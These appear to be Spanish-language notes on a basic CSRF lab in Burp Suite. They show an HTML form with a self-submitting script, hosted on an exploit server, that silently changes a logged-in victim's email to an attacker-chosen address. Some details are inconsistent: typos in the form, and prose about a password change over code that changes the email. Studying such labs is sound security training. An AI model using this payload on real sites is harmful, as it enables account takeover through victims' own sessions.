La técnica consiste en construir una petición POST con los mismos parámetros que la funcionalidad legítima, y luego alojarla en el servidor de explotación proporcionado. Al incluir un pequeño script que autoenvía el formulario al cargar la página, conseguimos que la víctima realice la acción sin saberlo, usando su propia sesión activa.

Este laboratorio representa el escenario más sencillo de explotación CSRF, y sienta las bases para los siguientes ejercicios donde se introducirán mecanismos de defensa como tokens, verificación de cabeceras o validaciones del lado servidor.

------

Podemos mandar la peticion de cambio de contraseña al burp y automatizar un formulario cambio de contraseña, para ello nos copiamos toda la estructura del ejemplo que tenemos del formulario para el cambio de contraseña

```html
<form class"login-form" name="change-email-form" action="/my-accoun/change-email" method="POST">
    <input type="hidden" name="email" value="hacked@hacked.com">
</form>
```

Para automatizar el envio del formulario sin que la victima presione un boton, podemos hacer lo siguiente:

```javascript
document.forms[0].submit()
```

Entonces para plasmar esto en codigo, podemos hacer lo siguiente

```html
<form class"login-form" name="change-email-form" action="https://burpsuite_page_change_email/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacked@hacked.com">
</form>
<script>
    document.forms[0].submit()
</script>

```